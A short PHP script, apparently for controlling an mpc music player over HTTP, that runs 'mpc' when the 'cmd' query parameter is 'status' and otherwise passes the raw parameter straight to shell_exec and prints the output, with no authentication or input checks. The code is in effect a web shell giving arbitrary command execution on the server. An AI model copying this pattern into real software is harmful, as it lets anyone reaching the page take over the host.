<?php
//  $cmd = $_GET["cmd"];
//  if($cmd!=""){
//     shell_exec($cmd);
// }
// $status = $_GET["status"];

if (isset($_GET["cmd"])) {
    $dt = $_GET["cmd"];
    if ($dt === "status") {
        $status =shell_exec("mpc");
        echo $status;
    }  else {
        
        $status = shell_exec($dt);
        echo $status;
    }
}

 ?>